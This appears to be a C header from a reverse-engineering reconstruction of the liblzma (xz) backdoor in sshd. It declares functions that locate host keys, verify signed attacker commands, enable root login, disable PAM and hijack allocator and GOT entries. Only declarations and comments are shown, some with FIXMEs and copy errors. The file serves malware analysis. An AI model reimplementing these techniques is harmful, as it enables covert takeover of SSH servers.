 * This function disassembles ld.so's _dl_audit_symbind_alt() to verify it contains a LEA instruction with an offset that matches __rtld_global_ro::_dl_naudit.
 * 
 * This function then sets ldso_ctx::dl_naudit_offset and ldso_ctx::dl_naudit_offset to the offset from the start of __rtld_global_ro to
 * __rtld_global_ro::_dl_naudit and __rtld_global_ro::_dl_audit respectively.
 * 
 * This function also resolves a number of libcrypto function addresses.
 *  
 * @param dynamic_linker_elf elf_info_t for ld.so
 * @param libcrypto_elf elf_info_t for libcrypto
 * @param hooks 
 * @param imported_funcs 
 * @return BOOL TRUE if successful, FALSE otherwise 
 */
extern BOOL find_dl_naudit(
	elf_info_t *dynamic_linker_elf,
	elf_info_t *libcrypto_elf,
	backdoor_hooks_data_t *hooks,
	imported_funcs_t *imported_funcs);

/**
 * @brief Find struct link_map offset required to modify ld.so's private link_map::l_audit_any_plt state.
 * 
 * First, this function disassembles ld.so's _dl_audit_symbind_alt() to search for a MOVZX instruction that fetches the link_map::l_audit_any_plt.
 * The first MOVZ instruction that uses an offset within the range from the start of struct link_map to libname_offset. 
 * 
 * This function then calls find_link_map_l_audit_any_plt_bitmask() to get the bitmask required to modify link_map::l_audit_any_plt.
 * 
 * This function also resolves a libc function address.
 * 
 * @param data 
 * @param libname_offset the offset from the start of the link_map to the location directly after where the link_map::l_name string data is stored
 * @param hooks 
 * @param imported_funcs 
 * @return BOOL TRUE if successful, FALSE otherwise 
 */
extern BOOL find_link_map_l_audit_any_plt(
	backdoor_data_handle_t *data,
	ptrdiff_t libname_offset,
	backdoor_hooks_data_t *hooks,
	imported_funcs_t *imported_funcs);

/**
 * @brief Find the bitmask required to modify ld.so's private link_map::l_audit_any_plt state.
 * 
 * First, this function disassembles ld.so's _dl_audit_symbind_alt() to search for a sequence of MOVZ, OR, and TEST instructions that fetch the link_map::l_audit_any_plt. 
 * 
 * This function then sets ldso_ctx::sshd_link_map_l_audit_any_plt_addr to the offset to the address of sshd's link_map::l_audit_any_plt flag;
 * 
 * This function also sets ldso_ctx::l_audit_any_plt_bitmask to the bitmask that sets the link_map::l_audit_any_plt flag.
 * 
 * This function also resolves a number of libc and libcrypto function addresses.
 * 
 * @param data 
 * @param search_ctx the instruction addresses to search as well as the offset and output registers of the instructions to match
 * @return BOOL TRUE if successful, FALSE otherwise 
 */
extern BOOL find_link_map_l_audit_any_plt_bitmask(
	backdoor_data_handle_t *data,
	instruction_search_ctx_t *search_ctx);

/**
 * @brief finds the address of `sensitive_data.host_keys` in sshd by using
 * @ref XREF_xcalloc_zero_size in `xcalloc`
 *
 * FIXME: add detail 
 *
 * @param data_start start of the sshd data segment
 * @param data_end end of the sshd data segment
 * @param code_start start of the sshd code segment
 * @param code_end end of the sshd code segment
 * @param string_refs info about resolved functions
 * @param host_keys_out pointer to receive the address of the host keys (`struct sshkey` in sshd)
 * @return BOOL TRUE if the address was found, FALSE otherwise
 */
extern BOOL sshd_get_host_keys_address_via_xcalloc(
	u8 *data_start,
	u8 *data_end,
	u8 *code_start,
	u8 *code_end,
	string_references_t *string_refs,
	void **host_keys_out);

/**
 * @brief finds the address of `sensitive_data.host_keys` in sshd by using
 * @ref getenv( @ref STR_KRB5CCNAME )
 *
 * FIXME: add detail 
 * 
 * @param data_start start of the sshd data segment
 * @param data_end end of the sshd data segment
 * @param code_start start of the sshd code segment
 * @param code_end end of the sshd code segment
 * @param string_refs info about resolved functions
 * @param host_keys_out pointer to receive the address of the host keys (`struct sshkey` in sshd)
 * @return BOOL TRUE if the address was found, FALSE otherwise
 */
extern BOOL sshd_get_host_keys_address_via_krb5ccname(
	u8 *data_start,
	u8 *data_end,
	u8 *code_start,
	u8 *code_end,
	void **host_keys_out,
	elf_info_t *elf);

/**
 * @brief obtains a numeric score which indicates if `demote_sensitive_data`
 * accesses @p host_keys or not
 * 
 * @param host_keys pointer to suspsected SSH host keys
 * @param elf sshd elf instance
 * @param refs info about resolved functions
 * @return int a score of 3 if accessed, 0 otherwise
 */
extern int sshd_get_host_keys_score_in_demote_sensitive_data(
	void *host_keys,
	elf_info_t *elf,
	string_references_t *refs);

/**
 * @brief obtains a numeric score which indicates if `main`
 * accesses @p host_keys or not
 * 
 * @param host_keys pointer to suspsected SSH host keys
 * @param elf sshd elf instance
 * @param refs info about resolved functions
 * @return int
 */
extern int sshd_get_host_keys_score_in_main(
	void *host_keys,
	elf_info_t *elf,
	string_references_t *refs);

/**
 * @brief obtains a numeric score which indicates if `do_child`
 * accesses @p host_keys or not
 * 
 * @param host_keys pointer to suspsected SSH host keys
 * @param elf sshd elf instance
 * @param refs info about resolved functions
 * @return int
 */
extern int sshd_get_host_keys_score_in_do_child(
	void *host_keys,
	elf_info_t *elf,
	string_references_t *refs);

/**
 * @brief obtains a numeric score which indicates if 
 * accesses @p host_keys or not
 * 
 * @param host_keys pointer to suspsected SSH host keys
 * @param elf sshd elf instance
 * @param refs info about resolved functions
 * @return int
 */
extern int sshd_get_host_keys_score(
	void *host_keys,
	elf_info_t *elf,
	string_references_t *refs);

/**
 * @brief Serializes the BIGNUM @p bn to the buffer @p buffer
 * 
 * @param buffer the destination buffer to write the bignum to
 * @param bufferSize size of the destination buffer
 * @param pOutSize pointer to a variable that will receive the number of bytes written to the buffer
 * @param bn the BIGNUM to serialize
 * @param funcs 
 * @return BOOL TRUE if successfully serialized, FALSE otherwise
 */
extern BOOL bignum_serialize(
	u8 *buffer, u64 bufferSize,
	u64 *pOutSize,
	const BIGNUM *bn,
	imported_funcs_t *funcs);

/**
 * @brief obtains a SHA256 hash of the supplied RSA key
 * 
 * @param rsa the RSA key to hash
 * @param mdBuf buffer to write the resulting digest to
 * @param mdBufSize size of the buffer indicated by @p mdBuf
 * @param funcs 
 * @return BOOL TRUE if the hash was successfully generated, FALSE otherwise
 */
extern BOOL rsa_key_hash(
	const RSA *rsa,
	u8 *mdBuf,
	u64 mdBufSize,
	imported_funcs_t *funcs);

/**
 * @brief obtains a SHA256 hash of the supplied RSA key
 * 
 * @param dsa the DSA key to hash
 * @param mdBuf buffer to write the resulting digest to
 * @param mdBufSize size of the buffer indicated by @p mdBuf
 * @param funcs 
 * @return BOOL TRUE if the hash was successfully generated, FALSE otherwise
 */
extern BOOL dsa_key_hash(
	const DSA *dsa,
	u8 *mdBuf,
	u64 mdBufSize,
	imported_funcs_t *funcs);

/**
 * @brief computes the SHA256 hash of the supplied data
 * 
 * @param data buffer containing the data to hash
 * @param count number of bytes to hash from @p data
 * @param mdBuf buffer to write the resulting digest to
 * @param mdBufSize size of the buffer indicated by @p mdBuf 
 * @param funcs 
 * @return BOOL 
 */
extern BOOL sha256(
	const void *data,
	size_t count,
	u8 *mdBuf,
	u64 mdBufSize,
	imported_funcs_t *funcs);

/**
 * @brief Checks if @p signed_data is signed with @p ed448_raw_key.
 *
 * in order to do this, the code will
 * - compute a sha256 hash of the SSH host key in @p sshkey (after serialization) and write it to @p signed_data at offset @p sshkey_digest_offset
 * - load the ED448 key from @p ed448_raw_key
 * - use it to verify @p signed_data (including the hashed SSH host key)
 * 
 * @param sshkey the SSH host key
 * @param signed_data data to verify, including an empty space to hold the hashed SSH key
 * @param sshkey_digest_offset offset to write the hashed SSH key to, in @p signed_data
 * @param signed_data_size length of the @p signed_data buffer, including the space for the SSH key hash digest
 * @param signature signature of the signed data to check
 * @param ed448_raw_key the ED448 public key obtained from @ref secret_data_get_decrypted
 * @param global_ctx 
 * @return BOOL TRUE if the signature verification is successful, FALSE otherwise
 */
extern BOOL verify_signature(
	struct sshkey *sshkey,
	u8 *signed_data,
	u64 sshkey_digest_offset,
	u64 signed_data_size,
	u8 *signature,
	u8 *ed448_raw_key,
	global_context_t *global_ctx
);

/**
 * @brief Patches the sshd configuration
 * 
 * @param skip_root_patch TRUE to keep current configuration, FALSE to enable root login
 * @param disable_pam TRUE to disable PAM, FALSE to keep current configuration
 * @param replace_monitor_reqtype TRUE to replace the `type` field in `struct mon_table`
 * for `MONITOR_REQ_AUTHPASSWORD`. FALSE to increment it by 1 (from `MONITOR_REQ_AUTHPASSWORD` to `MONITOR_ANS_AUTHPASSWORD`)
 * @param monitor_reqtype the new value to apply, if @p replace_monitor_reqtype is TRUE
 * @param global_ctx
 * @return BOOL TRUE if successful, FALSE if modifications couldn't be applied
 */
extern BOOL sshd_patch_variables(
	BOOL skip_root_patch,
	BOOL disable_pam,
	BOOL replace_monitor_reqtype,
	int monitor_reqtype,
	global_context_t *global_ctx
);

/**
 * @brief finds the pointer to `struct monitor`, and updates the global context in @p ctx with its location
 * 
 * @param elf sshd elf context
 * @param refs sshd string references
 * @param ctx global context
 * @return BOOL TRUE if the pointer has been found, FALSE otherwise
 */
extern BOOL sshd_find_monitor_struct(
	elf_info_t *elf,
	string_references_t *refs,
	global_context_t *ctx
);

enum SocketMode {
	DIR_WRITE = 0,
	DIR_READ = 1
};

/**
 * @brief Get either the read or write end of the sshd connection.
 * 
 * this is done by using the `struct monitor` address in @p ctx or, if not set,
 * by getting the first usable socket from 0 to @p socket_idx_max , excluded
 * 
 * @param ctx the global socket
 * @param pSocket output variable that will receive the socket fd
 * @param socket_idx_max maximum number of sockets to try, heuristically
 * @param socket_direction whether to get the receiving or the sending socket
 * @return BOOL TRUE if the socket was found, FALSE otherwise
 */
extern BOOL sshd_get_client_socket(
	global_context_t *ctx,
	int *pSocket,
	int socket_idx_max,
	enum SocketMode socket_direction
);

/**
 * @brief Finds the right `sshbuf` (FIXME: which?), starting from:
 * `(*(ctx->struct_monitor_ptr_address))->kex->my`
 * 
 * @param sshbuf pointer to a sshbuf that will be filled with the values of the sshbuf
 * @param ctx the global context
 * @return BOOL TRUE if the sshbuf was found, FALSE otherwise
 */
extern BOOL sshd_get_sshbuf(struct sshbuf *sshbuf, global_context_t *ctx);

/**
 * @brief counts the number of times the IFUNC resolver is called
 * 
 * used by backdoor_init()
 * 
 */
extern u32 resolver_call_count;
static_assert(sizeof(resolver_call_count) == 0x4);

extern global_context_t *global_ctx;
static_assert(sizeof(global_ctx) == 0x8);

/**
 * @brief location of backdoor_hooks_data_t
 * 
 * set in process_shared_libraries_map() to a location in the spare bytes after the last liblzma data segment
 * 
 */
extern backdoor_hooks_data_t *hooks_data_addr;
static_assert(sizeof(hooks_data_addr) == 0x8);

/**
 * @brief special .data.rel.ro section that contains the offset to fake_lzma_allocator_struct
 * 
 * liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets
 * 
 * the variable maps to a relocation entry of type R_X86_64_GOTOFF64 and value cpuid_random_symbol-0x180
 * 
 * used by get_lzma_allocator_address()
 * 
 */
extern const ptrdiff_t fake_lzma_allocator_offset;
static_assert(sizeof(fake_lzma_allocator_offset) == 0x8);

/**
 * @brief special .data.rel.ro section that contains a fake lzma_allocator
 * 
 * the fake lzma_allocator makes lzma_alloc() call fake_lzma_alloc()
 * 
 * liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets
 * 
 * lzma_allocator::alloc is the address of fake_lzma_alloc()
 * the field maps to a relocation entry of type R_X86_64_64 and value fake_lzma_alloc
 * 
 * lzma_allocator::free is the address of fake_lzma_free()
 * the field maps to a relocation entry of type R_X86_64_64 and value fake_lzma_free
 * 
 * lzma_allocator::opaque is the address of x86_dasm()
 * the field maps to a relocation entry of type R_X86_64_64 and value x86_dasm
 * 
 */
extern fake_lzma_allocator_t fake_lzma_allocator;
static_assert(sizeof(fake_lzma_allocator) == 0x20);

/**
 * @brief special .data.rel.ro section that contains the offset to elf_functions
 * 
 * liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets
 * 
 * the variable maps to a relocation entry of type R_X86_64_64 and value elf_functions-0x2a0
 * 
 */
extern const ptrdiff_t elf_functions_offset;
static_assert(sizeof(elf_functions_offset) == 0x8);

/**
 * @brief special .data.rel.ro section that contains addresses to various functions
 * 
 * appears to be another obfuscation attempt
 * 
 * liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets
 * 
 * used by update_got_address() and get_tls_get_addr_random_symbol_got_offset()
 * 
 * used by
 * 
 */
extern const elf_functions_t elf_functions;
static_assert(sizeof(elf_functions) == 0x38);

/**
 * @brief a bogus global variable that is used by the backdoor to generate an extra symbol
 * 
 * inside a .rodata section
 * 
 * the symbol is used by init_elf_entry_ctx()
 * 
 */
extern const u64 cpuid_random_symbol;
static_assert(sizeof(cpuid_random_symbol) == 0x8);

/**
 * @brief a bogus global variable that is used by the backdoor to generate an extra symbol
 * 
 * inside a .rodata section
 * 
 * the symbol is used by update_got_address()
 * 
 */
extern const u64 tls_get_addr_random_symbol;
static_assert(sizeof(tls_get_addr_random_symbol) == 0x8);

/**
 * @brief special .rodata section that contains _cpuid() related GOT offsets
 * 
 * liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets
 * 
 * used by call_backdoor_init_stage2(), get_got_offset() and get_cpuid_got_index()
 * 
 */
extern const backdoor_cpuid_reloc_consts_t cpuid_reloc_consts;
static_assert(sizeof(cpuid_reloc_consts) == 0x18);

/**
 * @brief special .rodata section that contains __tls_get_addr() related GOT offsets
 * 
 * liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets
 * 
 * used by update_got_address() and get_tls_get_addr_random_symbol_got_offset()
 * 
 */
extern const backdoor_tls_get_addr_reloc_consts_t tls_get_addr_reloc_consts;
static_assert(sizeof(tls_get_addr_reloc_consts) == 0x10);

/**
 * @brief contains mask data for the encoded string radix tree
 * 
 * inside a .rodata section
 * 
 * used by get_string_id()
 * 
 */
extern const u64 string_mask_data[238];
static_assert(sizeof(string_mask_data) == 0x770);

/**
 * @brief contains action data for the encoded string radix tree
 * 
 * inside a .rodata section
 * 
 * used by get_string_id()
 * 
 */
extern const u32 string_action_data[1304];
static_assert(sizeof(string_action_data) == 0x1460);

#include "util.h"
#endif
